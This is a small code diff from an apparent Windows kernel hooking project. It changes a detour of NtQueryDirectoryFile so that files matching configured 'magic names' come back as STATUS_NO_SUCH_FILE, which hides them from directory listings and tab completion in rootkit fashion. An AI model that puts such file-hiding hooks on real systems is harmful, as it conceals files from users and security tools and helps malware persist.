@@ -46,7 +46,7 @@ NTSTATUS DetourNtQueryDirectoryFile(
 			for (size_t i = 0; i < FileName->Length && i < MAX_PATH_SYSHOOKER - 1; i++) {
 				TempBuffer[i] = FileName->Buffer[i];
 			}
-			if (wcsstr(TempBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
+			if (matchMagicNames(TempBuffer, (Target)TARGET_FILE)) { // FileName is optionally used, for example, in tab-complete
 				return STATUS_NO_SUCH_FILE;
 			}
 		}
